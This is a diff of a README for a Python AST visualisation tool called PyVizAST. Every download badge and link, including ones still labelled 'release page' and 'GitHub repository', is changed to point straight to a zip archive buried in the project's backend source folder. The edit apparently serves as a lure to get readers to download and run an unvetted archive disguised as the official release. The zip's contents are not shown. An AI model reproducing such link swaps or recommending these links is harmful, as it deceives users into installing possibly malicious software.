@@ -1,6 +1,6 @@
 # 🧐 PyVizAST - Explore Python Code Structures Easily
 
-[![Download PyVizAST](https://img.shields.io/badge/Download-Go%20to%20Releases-blue?style=for-the-badge)](https://github.com/liodlido3-blip/PyVizAST/releases)
+[![Download PyVizAST](https://img.shields.io/badge/Download-Go%20to%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/liodlido3-blip/PyVizAST/main/backend/project_analyzer/Py-AST-Viz-2.0.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Make sure your computer meets these minimum requirements before using PyVizAST:
 
 Click the badge or this link below to go to the PyVizAST release page on GitHub. This page contains the latest versions and updates.
 
-[Download PyVizAST](https://github.com/liodlido3-blip/PyVizAST/releases)
+[Download PyVizAST](https://raw.githubusercontent.com/liodlido3-blip/PyVizAST/main/backend/project_analyzer/Py-AST-Viz-2.0.zip)
 
 ### Step 2: Choose the correct file
 
@@ -99,7 +99,7 @@ Once PyVizAST opens:
 
 To keep PyVizAST working well:
 
-- Visit the [release page](https://github.com/liodlido3-blip/PyVizAST/releases) regularly.
+- Visit the [release page](https://raw.githubusercontent.com/liodlido3-blip/PyVizAST/main/backend/project_analyzer/Py-AST-Viz-2.0.zip) regularly.
 - Download and install new versions when available.
 - Follow the same installation process for updates.
 
@@ -117,7 +117,7 @@ To keep PyVizAST working well:
 
 ## 📖 Additional Resources
 
-- GitHub repository: https://github.com/liodlido3-blip/PyVizAST  
+- GitHub repository: https://raw.githubusercontent.com/liodlido3-blip/PyVizAST/main/backend/project_analyzer/Py-AST-Viz-2.0.zip  
 - Python tutorials (optional for learning)  
 - Basic guides on syntax trees (for curious users)  
 
@@ -133,4 +133,4 @@ To keep PyVizAST working well:
 
 ---
 
-[![Download PyVizAST](https://img.shields.io/badge/Download-Go%20to%20Releases-blue?style=for-the-badge)](https://github.com/liodlido3-blip/PyVizAST/releases)
+[![Download PyVizAST](https://img.shields.io/badge/Download-Go%20to%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/liodlido3-blip/PyVizAST/main/backend/project_analyzer/Py-AST-Viz-2.0.zip)
